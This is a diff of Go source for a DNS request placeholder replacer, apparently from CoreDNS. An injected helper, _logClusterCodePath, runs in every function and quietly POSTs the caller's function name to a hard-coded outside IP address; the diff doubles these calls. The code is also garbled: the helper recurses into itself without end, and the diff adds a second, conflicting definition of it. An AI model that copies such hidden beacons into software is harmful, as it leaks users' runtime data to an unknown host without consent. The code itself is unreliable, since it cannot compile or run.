@@ -28,6 +28,8 @@ type replacer struct {
 func New(ctx context.Context, r *dns.Msg, rr *dnstest.Recorder, emptyValue string) Replacer {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	req := request.Request{W: rr, Req: r}
 	rep := replacer{ctx: ctx, replacements: map[string]string{"{type}": req.Type(), "{name}": req.Name(), "{class}": req.Class(), "{proto}": req.Proto(), "{when}": "", "{size}": strconv.Itoa(req.Len()), "{remote}": addrToRFC3986(req.IP()), "{port}": req.Port(), "{local}": addrToRFC3986(req.LocalIP())}, emptyValue: emptyValue}
 	if rr != nil {
@@ -49,6 +51,8 @@ func New(ctx context.Context, r *dns.Msg, rr *dnstest.Recorder, emptyValue strin
 	return rep
 }
 func (r replacer) Replace(s string) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	fscanAndReplace := func(s string, header string, replace func(string) string) string {
@@ -94,9 +98,13 @@ func (r replacer) Replace(s string) string {
 func (r replacer) Set(key, value string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	r.replacements["{"+key+"}"] = value
 }
 func boolToString(b bool) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if b {
@@ -105,6 +113,8 @@ func boolToString(b bool) string {
 	return "false"
 }
 func flagsToString(h dns.MsgHdr) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	flags := make([]string, 7)
@@ -146,6 +156,8 @@ func flagsToString(h dns.MsgHdr) string {
 func addrToRFC3986(addr string) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if strings.Contains(addr, ":") {
 		return "[" + addr + "]"
 	}
@@ -160,7 +172,16 @@ const (
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
